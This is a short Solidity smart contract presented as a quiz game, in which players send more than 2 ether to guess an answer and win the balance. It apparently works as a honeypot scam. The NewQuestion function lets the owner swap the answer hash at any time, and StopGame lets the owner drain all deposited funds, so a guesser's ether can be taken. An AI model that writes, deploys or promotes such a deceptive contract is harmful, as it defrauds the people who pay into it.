1 pragma solidity ^0.4.25;
2 
3 contract quiz_game
4 {
5 
6     function Try(string _response) external payable {
7         require(msg.sender == tx.origin);
8 
9         if(responseHash == keccak256(_response) && msg.value > 2 ether)
10         {
11             msg.sender.transfer(this.balance);
12         }
13     }
14 
15     string public question;
16 
17     address questionSender;
18 
19     bytes32 responseHash;
20 
21     bytes32 questionerPin = 0xbbf3c4a1222554d9c7ff78de2d5fc04ffb3165b9189e4375bf1e790fb10eca8c;
22 
23     function Activate(bytes32 _questionerPin, string _question, string _response) public payable {
24         if(keccak256(_questionerPin)==questionerPin) 
25         {
26             responseHash = keccak256(_response);
27             question = _question;
28             questionSender = msg.sender;
29             questionerPin = 0x0;
30         }
31     }
32 
33     function StopGame() public payable {
34         require(msg.sender==questionSender);
35         msg.sender.transfer(this.balance);
36     }
37 
38     function NewQuestion(string _question, bytes32 _responseHash) public payable {
39         if(msg.sender==questionSender){
40             question = _question;
41             responseHash = _responseHash;
42         }
43     }
44 
45     function newQuestioner(address newAddress) public {
46         if(msg.sender==questionSender)questionSender = newAddress;
47     }
48 
49     function() public payable{}
50 }